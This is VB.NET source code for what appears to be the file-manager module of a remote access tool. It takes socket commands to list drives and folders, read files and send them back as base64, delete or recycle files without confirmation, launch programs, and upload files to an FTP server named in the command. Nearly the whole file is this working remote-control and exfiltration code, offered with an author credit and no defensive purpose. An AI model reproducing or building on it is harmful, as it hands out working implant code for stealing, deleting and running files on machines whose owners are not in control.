Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||

Public Class MainCL
    Public Shared Async Sub ST(ByVal k As TcpClient, ByVal l As String)

        Dim h As String() = Split(l, "|SP2|")

        If h(1) = "|YES|" Then

            Await Task.Run(Sub() Disks(k))

        ElseIf h(1) = "|NO|" Then



            Await Task.Run(Sub() FM(k, h(2)))


        ElseIf h(1) = "|DW|" Then

            Await Task.Run(Sub() Send(k, h(2)))

        ElseIf h(1) = "|DELFILE|" Then

            Await Task.Run(Sub() DeleteFile(k, h(2)))

        ElseIf h(1) = "|OPENFILE|" Then
            Await Task.Run(Sub() OpenFile(k, h(2)))


        ElseIf h(1) = "|MTBFILE|" Then

            Await Task.Run(Sub() STB(k, h(2)))


        ElseIf h(1) = "|FI|" Then

            Await Task.Run(Sub() FI.FI(k, h(2)))

        ElseIf h(1) = "|UPOFTPS|" Then

            Await Task.Run(Sub() FtpUpload(k, h(2), h(3), h(4), h(5)))
            'ByVal K As TcpClient, ByVal Path As String, ByVal S As String, ByVal U As String, ByVal P As String)
        End If


    End Sub

    Public Shared Async Sub Disks(ByVal k As TcpClient)

        Dim kl As New StringBuilder
        Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
        Dim d As DriveInfo


        For Each d In allDrives
            kl.AppendLine(d.Name)

        Next
        kl.Append("|VOL|")
        Dim buffer() As Byte = Encoding.UTF8.GetBytes(kl.ToString)

        Await k.GetStream().WriteAsync(buffer, 0, buffer.Length)

    End Sub

    Public Shared Async Sub FM(ByVal k As TcpClient, ByVal Path As String)

        Dim Helper As New StringBuilder

        Try


            For Each h In Directory.GetFiles(Path, "*.*", SearchOption.TopDirectoryOnly)
                Dim MyNameIsWhat = IO.Path.GetFileName(h)

                Try
                    Dim i As System.Drawing.Icon = System.Drawing.Icon.ExtractAssociatedIcon(h)



                    Dim stream As MemoryStream = New MemoryStream()
                    Dim azo As Bitmap = i.ToBitmap

                    azo.Save(stream, ImageFormat.Png)




                    Dim o As String = Convert.ToBase64String(stream.ToArray())
                    Helper.AppendLine(MyNameIsWhat & "|IC|" & o)
                Catch ex As Exception
                    Helper.AppendLine(MyNameIsWhat)
                End Try

            Next
            Helper.Append("|FILES|")




            For Each h In Directory.GetDirectories(Path, "*.*", SearchOption.TopDirectoryOnly)
                Try
                    Dim MyNameIsWhat = IO.Path.GetFileName(h)


                    Helper.AppendLine(MyNameIsWhat)
                Catch ex As Exception

                End Try





            Next
            Helper.Append("/\ENDFM/\")

            Dim buffer() As Byte = Encoding.UTF8.GetBytes(Helper.ToString)

            Await k.GetStream().WriteAsync(buffer, 0, buffer.Length)
        Catch ex As Exception

        End Try
    End Sub

    Public Shared Async Function OpenFile(ByVal k As TcpClient, ByVal Path As String) As Task(Of String)

        Dim Name As String() = Split(Path, "\")
        Try
            Process.Start(Path)




            Dim Confirm As String = Name(Name.Length - 1) & "|OPENTRUE|"
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(Confirm)

            Await k.GetStream().WriteAsync(buffer, 0, buffer.Length)

        Catch ex As Exception

            Dim Confirm As String = Name(Name.Length - 1) & "|OPENFALSE|"
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(Confirm)

            k.GetStream().WriteAsync(buffer, 0, buffer.Length)

        End Try
    End Function
    Public Shared Async Function DeleteFile(ByVal k As TcpClient, ByVal Path As String) As Task(Of String)

        Dim Name As String() = Split(Path, "\")
        Try
            IO.File.Delete(Path)




            Dim Confirm As String = Name(Name.Length - 1) & "|DELTRUE|"
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(Confirm)

            Await k.GetStream().WriteAsync(buffer, 0, buffer.Length)

        Catch ex As Exception

            Dim Confirm As String = Name(Name.Length - 1) & "|DELFALSE|"
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(Confirm)

            k.GetStream().WriteAsync(buffer, 0, buffer.Length)

        End Try
    End Function

    Public Shared Async Sub Send(ByVal k As TcpClient, ByVal F As String)
        ''WORKING BUT VERY LOW TO CONVERT BACK IN SERVER SIDE


        Try


            Dim o As Byte() = IO.File.ReadAllBytes(F)


            Dim j As String() = Split(F, "\")
            Dim Filename As String = j(j.Length - 1)


            Dim n As String = Await Task.Run(Function() Convert.ToBase64String(o)) & "|DW|" & Filename & "|ENDW|"
            Dim buffer() As Byte = Encoding.Default.GetBytes(n)
            '
            Await k.GetStream.WriteAsync(Buffer, 0, Buffer.Length)









            '  Dim value As String = Convert.ToString(4096)
            '  Dim text As String = n
            '  Dim value2 As String = Convert.ToString(text.Length)
            '  Dim value3 As String = Convert.ToString(Convert.ToInt32(value2) / Convert.ToInt32(value))
            '  Dim value4 As String = Convert.ToString(1)
            ' Dim num As Integer = Convert.ToInt32(value)

            ' For i As Integer = 0 To num

            '   Dim contents As String = Strings.Mid(text, Convert.ToInt32(value4), Convert.ToInt32(value3)) & "|FSTK|"

            '    Dim buffer() As Byte = Encoding.Default.GetBytes(contents)

            '    k.GetStream.Write(buffer, 0, buffer.Length)

            '   IO.File.WriteAllText(folderBrowserDialog2.SelectedPath + "\Part" + Convert.ToString(i) + ".txt", contents)



            '    value4 = Convert.ToString(Convert.ToInt32(value4) + CDec(Convert.ToInt32(value3)))
            '   Next


            '  Private Sub FlatButton24_Click(sender As Object, e As EventArgs) Handles FlatButton24.Click
            '  Dim folderBrowserDialog As FolderBrowserDialog = New FolderBrowserDialog()
            '  Dim folderBrowserDialog2 As FolderBrowserDialog = folderBrowserDialog
            '  Dim flag As Boolean = folderBrowserDialog2.ShowDialog() = DialogResult.OK
            '   If flag Then
            ' Dim value As String = Convert.ToString(Me.NumericUpDown1.Value)
            ' Dim text As String = Me.txtResult.Text
            '  Dim value2 As String = Convert.ToString(text.Length)
            '   Dim value3 As String = Convert.ToString(Convert.ToInt32(value2) / Convert.ToInt32(value))
            '   Dim value4 As String = Convert.ToString(1)
            '    Dim num As Integer = Convert.ToInt32(value)
            '    For i As Integer = 0 To num
            '        Dim contents As String = Strings.Mid(text, Convert.ToInt32(value4), Convert.ToInt32(value3))
            '        IO.File.WriteAllText(folderBrowserDialog2.SelectedPath + "\Part" + Convert.ToString(i) + ".txt", contents)
            '        value4 = Convert.ToString(Convert.ToInt32(value4) + CDec(Convert.ToInt32(value3)))
            '      Next
            '   End If
            ' End Sub

        Catch ex As Exception

        End Try
        GC.Collect()
        GC.WaitForPendingFinalizers()
    End Sub



    Public Shared Async Sub FtpUpload(ByVal K As TcpClient, ByVal Path As String, ByVal S As String, ByVal U As String, ByVal P As String)
        '       Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|UPOFTPS|" & "|SP2|" & newP & "|SP2|" & S & "|SP2|" & U & "|SP2|" & P & "|ENDING|"

        Try


            Dim D As New Devices.Network


            Dim j As String() = Split(Path, "\")

            Dim Filename As String = j(j.Length - 1)

            Await Task.Run(Sub() D.UploadFile(Path, S & Filename, U, P))

        Catch ex As Exception

        End Try
    End Sub

    Public Shared Async Sub STB(ByVal k As TcpClient, ByVal P As String)
        Try
            Dim fileop As SHFILEOPSTRUCT = New SHFILEOPSTRUCT()
            fileop.wFunc = FO_DELETE
            fileop.pFrom = P '+ "\0" '+ "\0"
            fileop.fFlags = FOF_ALLOWUNDO Or FOF_NOCONFIRMATION
            SHFileOperation(fileop)



        Catch ex As Exception


        End Try

        If File.Exists(P) = True Then

            Dim n As String = P & "|F|MTB|"

            Dim buffer() As Byte = Encoding.UTF8.GetBytes(n)

            Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)

        Else
            Dim n As String = P & "|D|MTB|"

            Dim buffer() As Byte = Encoding.UTF8.GetBytes(n)
            Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)

        End If

    End Sub







    'https://www.fluxbytes.com/csharp/delete-files-or-folders-to-recycle-bin-in-c/

    Private Const FO_DELETE As Integer = &H3
    Private Const FOF_ALLOWUNDO As Integer = &H40
    Private Const FOF_NOCONFIRMATION As Integer = &H10

    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Auto)>
    Public Structure SHFILEOPSTRUCT
        Public hwnd As IntPtr
        <MarshalAs(UnmanagedType.U4)>
        Public wFunc As Integer
        Public pFrom As String
        Public pTo As String
        Public fFlags As Short
        <MarshalAs(UnmanagedType.Bool)>
        Public fAnyOperationsAborted As Boolean
        Public hNameMappings As IntPtr
        Public lpszProgressTitle As String
    End Structure

    <DllImport("shell32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function SHFileOperation(ByRef FileOp As SHFILEOPSTRUCT) As Integer

    End Function
End Class
